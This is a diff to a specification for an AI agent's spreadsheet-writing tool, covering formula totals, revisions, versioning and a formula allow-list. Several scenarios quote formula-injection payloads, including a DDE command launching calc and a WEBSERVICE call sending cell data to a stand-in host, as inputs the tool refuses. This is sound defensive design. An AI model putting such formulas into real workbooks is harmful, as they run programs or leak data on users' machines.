@@ -40,13 +40,14 @@ The system SHALL apply each column's declared type as an Excel number format (`t
 
 ### Requirement: Totals are live formulas
 
-When a column declares a total (`sum`, `average`, `min`, `max`, `count`), the system SHALL add one totals row after the data whose cells are Excel formulas over that column's data range, formatted like the column. The row's label SHALL name the functions used, in the conversation language: Total, Moyenne, Min, Max, Nombre in French (the default) and Total, Average, Min, Max, Count in English.
+When a column declares a total (`sum`, `average`, `min`, `max`, `count`), the system SHALL add one totals row after the data whose cells are Excel formulas over that column's data range, formatted like the column, each written with its computed value cached in the file. The row's label SHALL name the functions used, in the conversation language: Total, Moyenne, Min, Max, Nombre in French (the default) and Total, Average, Min, Max, Count in English.
 
 #### Scenario: Sum of a currency column
 
 - **GIVEN** a `currency` column with `total: "sum"` over rows 2 to 11
 - **WHEN** the workbook is generated
 - **THEN** row 12 holds `=SUM(C2:C11)` in that column and "Total" in the first text column
+- **AND** a reader that does not recalculate (openpyxl with `data_only=True`) reads the sum, not an empty cell
 
 #### Scenario: Label follows the function and the language
 
@@ -56,7 +57,7 @@ When a column declares a total (`sum`, `average`, `min`, `max`, `count`), the sy
 
 ### Requirement: Invalid input is returned to the model
 
-The system SHALL reject invalid input with an error tool result that names the sheet, row and column at fault, and SHALL NOT write any file in that case. Invalid input includes an empty, duplicated, over-31-character or reserved (`History`) sheet name, a name containing `[ ] : * ? / \` or control characters, a row whose length differs from the column count, a value that cannot be converted to its column type, a non-finite number, a formula (any `=` value in a number, integer, percent or currency column, or a text cell such as `=SUM(B2:B6)` or `=B2/B3` that calls a function or references a cell), a number whose lone comma could separate thousands or decimals (`"1,234"`), and a text value holding other cells' JSON (a quote inside the text that closed it early, such as `Loyer", 1200, null], [`), which would otherwise shift the row's values into the wrong cells. Control characters in cells and headers SHALL be removed, never raised as an error.
+The system SHALL reject invalid input with an error tool result that names the sheet, row and column at fault, and SHALL NOT write any file in that case. Invalid input includes an empty, duplicated, over-31-character or reserved (`History`) sheet name, a name containing `[ ] : * ? / \` or control characters, a row whose length differs from the column count, a value that cannot be converted to its column type, a non-finite number, a formula sent as a plain string (one that parses as a formula calling a function or referencing a cell, on this sheet, another sheet, another workbook or through DDE, such as `=SUM(B2:B6)`, `=B2/B3`, `='Données 2025'!B2`, `=[x.xlsx]S!A1` or `=cmd|' /C calc'!A0`, or any `=` value in a number, integer, percent or currency column), a number whose lone comma could separate thousands or decimals (`"1,234"`), and a text value holding other cells' JSON (a quote inside the text that closed it early, such as `Loyer", 1200, null], [`), which would otherwise shift the row's values into the wrong cells. Control characters in cells and headers SHALL be removed, never raised as an error.
 
 #### Scenario: Row length mismatch
 
@@ -66,7 +67,12 @@ The system SHALL reject invalid input with an error tool result that names the s
 #### Scenario: Formula sent as a cell value
 
 - **WHEN** the model sends `=B2/SUM($B$2:$B$6)` in a percent column
-- **THEN** the tool returns an error saying formulas are not accepted in cells, asking for the computed value and pointing to the column `compute` for per-row calculations and to the column `total` for sums and averages, and no file is written
+- **THEN** the tool returns an error saying a formula is not accepted as a plain value, giving the formula-cell form to send (`{"formula": "=B2/SUM($B$2:$B$6)"}`) and pointing to the column `compute` for per-row calculations and to the column `total` for sums and averages, and no file is written
+
+#### Scenario: Sheet-qualified formula sent as text
+
+- **WHEN** the model sends `='Données 2025'!B2` or `=Synthèse!B2` as a plain text cell
+- **THEN** the tool returns the same error with the formula-cell form, instead of writing the text literally
 
 #### Scenario: Ambiguous number
 
@@ -87,7 +93,7 @@ The system SHALL reject invalid input with an error tool result that names the s
 
 ### Requirement: Computed columns are per-row formulas
 
-A column MAY declare `compute` instead of row values: `add`, `subtract`, `multiply` or `divide` between `left` and `right` (each a column header of the same sheet or a number), or `share_of_total` of one `column` (its value divided by that column's total), with an optional `round` (0 to 10 decimals). The system SHALL write one formula per data row using that row's cell addresses on the same sheet and only the `SUM`, `ROUND` and `IFERROR` functions; a result that can divide by zero, or that uses a computed column that can be empty, SHALL be wrapped in `IFERROR(...,"")`. Rows SHALL accept either `null` (any value is ignored) or no value at all for computed columns. A computed column without an explicit type SHALL be `number` (`percent` for `share_of_total`); a column `total` SHALL apply to it as to any numeric column. A `number` computed column with `round` SHALL show that many decimals. The preview SHALL hold the values the formulas yield (an empty source cell counts as 0, a division by zero is empty, `round` rounds halves away from zero). The system SHALL reject, naming the sheet and column and the fix, an unsupported op, a header that matches no column or several columns, a reference to a text or date column, to its own column or to a computed column placed after it, a computed text or date column, a missing operand, two number operands, a division by a literal 0 and a `round` outside 0 to 10.
+A column MAY declare `compute` instead of row values: `add`, `subtract`, `multiply` or `divide` between `left` and `right` (each a column header of the same sheet or a number), or `share_of_total` of one `column` (its value divided by that column's total), with an optional `round` (0 to 10 decimals). The system SHALL write one formula per data row using that row's cell addresses on the same sheet and only the `SUM`, `ROUND` and `IFERROR` functions, each with its computed value cached in the file, through the same writer and evaluator as model-written formulas; a result that can divide by zero, or that uses a computed column that can be empty, SHALL be wrapped in `IFERROR(...,"")`. Rows SHALL accept either `null` (any value is ignored) or no value at all for computed columns. A computed column without an explicit type SHALL be `number` (`percent` for `share_of_total`); a column `total` SHALL apply to it as to any numeric column. A `number` computed column with `round` SHALL show that many decimals. The preview SHALL hold the values the formulas yield (an empty source cell counts as 0, a division by zero is empty, `round` rounds halves away from zero). The system SHALL reject, naming the sheet and column and the fix, an unsupported op, a header that matches no column or several columns, a reference to a text or date column, to its own column or to a computed column placed after it, a computed text or date column, a missing operand, two number operands, a division by a literal 0 and a `round` outside 0 to 10.
 
 #### Scenario: Tax-inclusive amount
 
@@ -146,13 +152,19 @@ The system SHALL refuse a workbook above 10 sheets, 50 columns per sheet, 5 000 
 
 ### Requirement: Generated workbooks run no code
 
-The system SHALL write `.xlsx` only (never macro-enabled formats), SHALL write formulas only in the totals row and the computed columns it generates, and SHALL store any accepted text cell starting with `=`, `+`, `-`, `@`, tab or carriage return as literal text.
+The system SHALL write `.xlsx` only (never macro-enabled formats), SHALL write formulas only from `total`, `compute`, a column `formula` and formula cells, each validated against the function allow-list, and SHALL store any other accepted text cell starting with `=`, `+`, `-`, `@`, tab or carriage return as literal text. The system SHALL refuse a text cell, header or sheet name that starts with `=`, `+`, `-` or `@` (full-width forms included) and holds a DDE pattern (`name|`) or an external-workbook pattern (`[book.xlsx]`, a path or URL before `!`), even as text.
 
 #### Scenario: Data that looks like a formula
 
 - **GIVEN** a text cell `=== Section ===` or `@SUM(A1)`
 - **WHEN** the workbook is generated
 - **THEN** the cell holds that literal string and no formula
+
+#### Scenario: DDE text refused
+
+- **WHEN** the model sends the text `=cmd|' /C calc'!A0` or `@SUM(1+1)*cmd|' /C calc'!A0` in a text column
+- **THEN** the tool returns an error naming the sheet, row and column, saying the text looks like a link to another program or file and asking to drop the leading sign or rephrase, and no file is written
+- **AND** `+33 6 12 34 56 78`, `- point` and `a|b` are kept as literal text
 
 ### Requirement: A created file is not created again
 
@@ -229,7 +241,7 @@ Each created workbook SHALL be stored with a JSON preview beside it, and the con
 
 - **GIVEN** the agent already created a workbook in this conversation
 - **WHEN** the user asks for a corrected version
-- **THEN** a new `.xlsx` and a new card are produced and the previous file stays available
+- **THEN** a new `.xlsx` and a new card are produced, named as the next version (`Budget-v2.xlsx`), and the previous file stays available
 
 #### Scenario: Download from the panel
 
@@ -247,3 +259,136 @@ Each created workbook SHALL be stored with a JSON preview beside it, and the con
 - **GIVEN** the workbook was stored but its preview upload fails
 - **WHEN** the tool returns
 - **THEN** the conversation shows the plain download chip for the `.xlsx`
+
+### Requirement: Users revise the last workbook with targeted changes
+
+The `create_spreadsheet` tool SHALL accept either `sheets` (the whole workbook) or `changes`, a list of operations applied to the last workbook delivered in the conversation by the same agent: `add_column` (a computed or formula column included), `remove_column`, `edit_column`, `add_rows`, `remove_rows`, `edit_rows`, `edit_cell`, `rename_sheet`, `add_sheet`, `remove_sheet` and `move_rows` (to an existing sheet, or to a new sheet created with the source's columns). Sheets SHALL be addressed by name, columns by header, rows by their row number in the file (header = row 1) or by a `where` match on a column value. All names and numbers SHALL refer to the base workbook, never shifted by earlier changes of the same call. The system SHALL apply the changes to the stored request and build the whole resulting workbook through the same validation, formulas, writer and preview as a `sheets` call, adjusting formula references like Excel when rows, columns or sheets change. It SHALL reject, listing every bad change with its index and the fix and writing no file: `sheets` and `changes` together, an unknown op, sheet, header or row (naming the existing ones), incompatible changes on the same target, a change that would leave a formula pointing at a removed cell, column or sheet or that moves rows a formula references (naming each dependent formula), a call with no base, and a call that changes nothing.
+
+#### Scenario: Add a computed column
+
+- **GIVEN** the agent delivered `Budget.xlsx` with columns "Poste", "Budget", "Réel" on sheet "Budget"
+- **WHEN** the user asks to add a difference column and the model sends `changes: [{op: "add_column", sheet: "Budget", column: {header: "Écart", type: "currency", compute: {op: "subtract", left: "Réel", right: "Budget"}}}]`
+- **THEN** `Budget-v2.xlsx` is delivered with the three columns unchanged, "Écart" last holding `=C2-B2` on every row, and the model sent no row data
+
+#### Scenario: Add rows with values
+
+- **WHEN** the model sends `{op: "add_rows", sheet: "Budget", rows: [["Loyer", 1200, 1150]]}`
+- **THEN** the row is appended after the last data row, the totals row moves below it, its formulas cover the new row, and a summary formula whose range ended on the last data row covers it too
+
+#### Scenario: Split a table into two sheets
+
+- **GIVEN** a sheet "Ventes" with a "Région" column
+- **WHEN** the model sends `{op: "move_rows", sheet: "Ventes", where: {column: "Région", equals: "Sud"}, to_sheet: "Sud"}` and `{op: "rename_sheet", sheet: "Ventes", name: "Nord"}`
+- **THEN** the new version has a sheet "Nord" with the other rows and a sheet "Sud" with the same columns and the moved rows, each with its own totals
+
+#### Scenario: Rename a sheet used by formulas
+
+- **GIVEN** a "Synthèse" sheet holding `=SUM('Données 2025'!C2:C50)`
+- **WHEN** the model renames "Données 2025" to "Données"
+- **THEN** the formula reads `=SUM('Données'!C2:C50)` in the new version
+
+#### Scenario: Remove a column a formula needs
+
+- **WHEN** the model removes the column "Budget" that the computed column "Écart" uses
+- **THEN** the tool returns an error naming "Écart" and asking to remove or edit it in the same changes, and no file is written
+
+#### Scenario: Errors listed at once
+
+- **WHEN** a call holds a `remove_rows` of row 40 on a sheet with data rows 2 to 14 and an `edit_rows` on an unknown header
+- **THEN** the error lists both changes by index, with the valid row range and the sheet's headers, and the base stays the delivered workbook
+
+#### Scenario: No previous workbook
+
+- **WHEN** the model sends `changes` in a conversation with no delivered workbook for this agent
+- **THEN** the tool returns "No file was written: there is no previous workbook in this conversation to change. Send the whole workbook in sheets."
+
+#### Scenario: Nothing changed
+
+- **WHEN** the changes produce the same workbook as the base
+- **THEN** the tool returns an error saying nothing changed and not to tell the user it was changed, and no file or card is produced
+
+### Requirement: The revision base survives trimming and replicas
+
+After each delivery the system SHALL store the delivered request, per conversation and agent instance, in a capability-owned table with its own migrations, so that a `changes` call in a later turn finds it on any replica, after the conversation history was trimmed, and on ReAct, Deep and Graph agents. A failed write SHALL NOT fail the delivery. A request too large to store (over 4 MB) SHALL be delivered with a success text saying changes are not available for this file.
+
+#### Scenario: Revision after history trimming
+
+- **GIVEN** a workbook delivered many turns ago, whose tool call is no longer in the model's context
+- **WHEN** the user asks to add a row and the request reaches another fred-agents replica
+- **THEN** the change applies to that delivered workbook and a new version is delivered
+
+#### Scenario: Graph agent revision
+
+- **WHEN** a Graph agent with the capability calls the tool with `changes` after a delivery
+- **THEN** the change applies as on a ReAct agent
+
+### Requirement: Versions are named and the latest is marked
+
+A `changes` call, or a `sheets` call with the same file name as the base, SHALL deliver the next version of the same workbook, named `<name>-v<n>.xlsx` from version 2; a `sheets` call with another file name SHALL start a new workbook at version 1. Every version SHALL be a new file and a new card. The conversation SHALL mark the card of the highest version of each workbook as the latest, live and when the conversation is reloaded; older cards SHALL show their version and keep downloading their own file.
+
+#### Scenario: Latest card moves
+
+- **GIVEN** cards for `Budget.xlsx` and `Budget-v2.xlsx`
+- **WHEN** `Budget-v3.xlsx` is delivered
+- **THEN** only its card shows "Latest version" ("Dernière version"), the two others show "Version 1" and "Version 2", and reloading the conversation shows the same
+
+### Requirement: Model-written formulas follow an allow-list
+
+A column MAY declare `formula`, the formula of its first data row, which the system SHALL fill down like Excel (relative references shift, `$` references stay); a cell MAY hold `{"formula": "..."}`. The system SHALL accept only functions of the allow-list (math, statistics, conditional aggregates, logical, text, date, `VLOOKUP`, `INDEX`, `MATCH`, `XLOOKUP`, `XMATCH`, `FILTER`, `SORT`, `UNIQUE`), written with English names and commas, and SHALL write each with the prefix Excel expects (`_xlfn.XLOOKUP`, `_xlfn._xlws.FILTER`), dynamic arrays with spill metadata. It SHALL refuse, naming the sheet, cell and the fix: volatile functions (`INDIRECT`, `OFFSET`, `NOW`, `TODAY`, `RAND`, `RANDBETWEEN`, `RANDARRAY`), network, link and environment functions (`WEBSERVICE`, `FILTERXML`, `ENCODEURL`, `IMAGE`, `RTD`, `HYPERLINK`, `CELL`, `INFO`), XLM macro functions, references to another workbook, DDE, unknown functions, defined names, structured table references, R1C1 and whole-column or whole-row references, a French function name or `;` separator (giving the English form), a cycle, a spill that would overwrite a filled cell, and a formula over 8 192 characters or 32 levels of nesting.
+
+#### Scenario: Lookup across sheets
+
+- **GIVEN** sheets "Commandes" and "Tarifs"
+- **WHEN** the model declares a column "Prix" with `formula: "=XLOOKUP(B2,Tarifs!A2:A40,Tarifs!B2:B40,\"\")"`
+- **THEN** each data row holds that lookup with its own row number, stored as `_xlfn.XLOOKUP`, and opens in Excel without a repair prompt or an `@` prefix
+
+#### Scenario: Dangerous function refused
+
+- **WHEN** the model sends `{"formula": "=WEBSERVICE(\"https://x.example/?\"&A2)"}` or `=HYPERLINK("file:///C:/x")` or `=INDIRECT("B"&A2)`
+- **THEN** the tool returns an error naming the sheet and cell and saying the function is not accepted and why, and no file is written
+
+#### Scenario: Filter spill
+
+- **WHEN** a formula cell holds `=FILTER(Ventes!A2:C40,Ventes!B2:B40="Sud")` with empty cells below and to its right
+- **THEN** the file holds a dynamic-array formula `_xlfn._xlws.FILTER` and the preview shows the filtered rows
+- **AND** if a filled cell lies in the spill area, the tool returns an error naming the cell and the spill size
+
+### Requirement: Cross-sheet references are checked
+
+A reference to another sheet SHALL name a sheet of the same workbook (case ignored) and SHALL be written in canonical form, the exact sheet name quoted when it holds anything other than ASCII letters, digits, `_` and `.`, starts with a digit or looks like a cell address, with `'` doubled. A reference SHALL stay inside the target sheet's columns and rows (header to totals row), and a range SHALL NOT span data rows and the totals row. A summary sheet MAY reference any other sheet of the workbook.
+
+#### Scenario: Summary sheet
+
+- **GIVEN** sheets "Données 2025" and "Synthèse"
+- **WHEN** a "Synthèse" cell holds `{"formula": "=SUM(Données 2025!C2:C50)"}` written without quotes, or `{"formula": "=SUM('données 2025'!C2:C50)"}`
+- **THEN** the file holds `=SUM('Données 2025'!C2:C50)` with the sum cached, and the preview shows the sum
+
+#### Scenario: Unknown sheet or out-of-range reference
+
+- **WHEN** a formula references `Synthese!B2` in a workbook without that sheet, or `'Données 2025'!H2` on a sheet with columns A to E
+- **THEN** the tool returns an error naming the cell, listing the workbook's sheets, or the target's columns A to E and its row range, and no file is written
+
+#### Scenario: Range including the totals row
+
+- **WHEN** a formula sums `'Données 2025'!C2:C60` on a sheet whose totals row is 51
+- **THEN** the tool returns an error saying the range would count the totals row and giving `C2:C50`
+
+### Requirement: Formula results are cached and previewed
+
+The system SHALL evaluate every formula of the workbook server-side (totals, computed columns, column formulas, formula cells, across sheets) with Excel's semantics for the allow-list, write each result as the formula's cached value (an error as an Excel error value), set the workbook to recalculate on open, and show the results in the preview. Evaluation SHALL run off the event loop within the build's concurrency bound and SHALL stop with a limit error, telling the model to inform the user, beyond a fixed cell-read budget.
+
+#### Scenario: Viewer without recalculation
+
+- **GIVEN** a workbook with totals, a computed column and a summary sheet
+- **WHEN** it is read without recalculation
+- **THEN** every formula cell holds the value the preview shows
+
+#### Scenario: Error value
+
+- **WHEN** a formula divides by an empty cell without `IFERROR`
+- **THEN** the file caches `#DIV/0!` and the preview shows `#DIV/0!`, as Excel would
+
+#### Scenario: Evaluation budget
+
+- **WHEN** a workbook's formulas would read more cells than the budget allows
+- **THEN** the tool returns a limit error asking the model to tell the user and to use `total` or fewer lookups, and no file is written
